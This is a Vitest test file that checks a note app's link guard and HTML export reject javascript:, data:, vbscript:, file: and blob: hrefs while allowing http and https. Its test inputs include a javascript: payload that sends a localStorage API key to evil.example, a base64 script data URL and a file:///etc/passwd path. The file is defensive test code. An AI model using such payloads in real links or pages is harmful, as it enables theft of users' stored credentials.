import { describe, expect, it } from 'vitest'
import { inline, safeHref } from '../../src/state/rich'
import { noteHtml } from '../../src/state/exportPage'

/* Which links a note is allowed to be.
 *
 * A note is not always one you wrote. `importTree` will read any board file
 * somebody sends you and the relay lets an agent write notes, so the text of a
 * link is untrusted input. A `javascript:` or `data:` href is code, and the
 * origin it would run in holds every board in IndexedDB and the picture key in
 * localStorage.
 *
 * The parser is deliberately left alone here: it is allowed to read a strange
 * href out of the text, because refusing to parse it would only move the
 * question. What must hold is that nothing downstream ever follows one. Both
 * renderers ask `safeHref`, so both are checked here. */

const hrefs = (src: string) =>
  inline(src)
    .map((s) => s.href)
    .filter(Boolean) as string[]

describe('safeHref', () => {
  it('follows http and https', () => {
    expect(safeHref('https://example.com/a')).toBe('https://example.com/a')
    expect(safeHref('http://example.com')).toBe('http://example.com')
    expect(safeHref('HTTPS://EXAMPLE.COM')).toBe('HTTPS://EXAMPLE.COM')
  })

  it('refuses a scheme that runs code', () => {
    /* No parentheses and no spaces, because the parser stops at either — so
       this is the shape a payload would actually have to take to get through
       it. The board's own storage key is the thing worth reading. */
    const live = "javascript:location=`https://evil.example/${localStorage['ideation.ai.key']}`"
    expect(safeHref(live)).toBeNull()
    expect(safeHref('javascript:alert')).toBeNull()
    expect(safeHref('JaVaScRiPt:alert')).toBeNull()
    expect(safeHref('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')).toBeNull()
    expect(safeHref('vbscript:msgbox')).toBeNull()
    expect(safeHref('file:///etc/passwd')).toBeNull()
    expect(safeHref('blob:https://example.com/abc')).toBeNull()
  })

  it('is not fooled by space around the scheme, which a browser ignores', () => {
    expect(safeHref('  javascript:alert')).toBeNull()
    expect(safeHref('\n\tjavascript:alert')).toBeNull()
    /* And the same trimming still lets a real address through. */
    expect(safeHref('  https://example.com  ')).toBe('https://example.com')
  })

  it('refuses nothing at all', () => {
    expect(safeHref('')).toBeNull()
    expect(safeHref(undefined)).toBeNull()
    expect(safeHref(null)).toBeNull()
  })
})

describe('the parser still reads the href, so the guard is what matters', () => {
  it('hands back a javascript: href from a written link', () => {
    /* If this ever stops being true the guard is untested rather than
       unnecessary, so it is asserted rather than assumed. */
    expect(hrefs('[x](javascript:location=`a`)')).toEqual(['javascript:location=`a`'])
  })

  it('and a bare address, which can only ever be http or https', () => {
    expect(hrefs('see https://example.com/a for more')).toEqual(['https://example.com/a'])
  })
})

describe('the exported page', () => {
  it('writes an anchor for an address', () => {
    expect(noteHtml('[go](https://example.com/a)')).toContain('<a href="https://example.com/a"')
  })

  it('keeps the words and drops the link for anything else', () => {
    const out = noteHtml('[click me](javascript:location=`a`)')
    expect(out).toContain('click me')
    expect(out).not.toContain('<a ')
    expect(out).not.toContain('javascript:')
  })

  it('does not let a data: document through either', () => {
    const out = noteHtml('[doc](data:text/html;base64,PHNjcmlwdD4=)')
    expect(out).toContain('doc')
    expect(out).not.toContain('<a ')
    expect(out).not.toContain('data:text/html')
  })
})
